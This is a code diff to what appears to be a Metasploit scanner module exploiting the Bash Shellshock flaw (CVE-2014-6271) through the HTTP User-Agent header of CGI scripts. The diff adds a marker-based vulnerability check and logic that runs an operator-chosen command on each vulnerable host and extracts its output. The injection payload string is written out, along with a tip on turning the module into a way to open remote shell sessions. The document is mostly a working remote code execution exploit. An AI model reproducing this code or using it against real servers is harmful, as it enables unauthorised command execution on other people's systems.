@@ -9,6 +9,7 @@ class Metasploit4 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
@@ -17,6 +18,10 @@ class Metasploit4 < Msf::Auxiliary
         This module exploits a code injection in specially crafted environment
         variables in Bash, specifically targeting Apache mod_cgi scripts through
         the HTTP_USER_AGENT variable.
+
+        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
+        CMD, set ExitOnSession false, run -j, and then run this module to create
+        sessions on vulnerable hosts.
       },
       'Author' => [
         'Stephane Chazelas', # Vulnerability discovery
@@ -24,7 +29,7 @@ class Metasploit4 < Msf::Auxiliary
       ],
       'References' => [
         ['CVE', '2014-6271'],
-        ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
+        ['URL', 'https://access.redhat.com/articles/1200223'],
         ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
       ],
       'DisclosureDate' => 'Sep 24 2014',
@@ -38,18 +43,52 @@ class Metasploit4 < Msf::Auxiliary
       OptString.new('CMD', [true, 'Command to run (absolute paths required)',
         '/usr/bin/id'])
     ], self.class)
+
+    @marker = marker
+  end
+
+  def check_host(ip)
+    res = req("echo #{@marker}")
+
+    if res && res.body.include?(@marker * 3)
+      report_vuln(
+        :host => ip,
+        :port => rport,
+        :name => self.name,
+        :refs => self.references
+      )
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
   end
 
   def run_host(ip)
-    res = send_request_raw(
+    return unless check_host(ip) == Exploit::CheckCode::Vulnerable
+
+    res = req(datastore['CMD'])
+
+    if res && res.body =~ /#{@marker}(.+)#{@marker}/m
+      print_good("#{peer} - #{$1}")
+      report_vuln(
+        :host => ip,
+        :port => rport,
+        :name => self.name,
+        :refs => self.references
+      )
+    end
+  end
+
+  def req(cmd)
+    send_request_cgi(
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
-      'agent' => "() { :;}; #{datastore['CMD']}"
+      'agent' => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
     )
+  end
 
-    if res && res.code == 200
-      vprint_good("#{peer} - #{res.body}")
-    end
+  def marker
+    Rex::Text.rand_text_alphanumeric(rand(42) + 1)
   end
 
 end
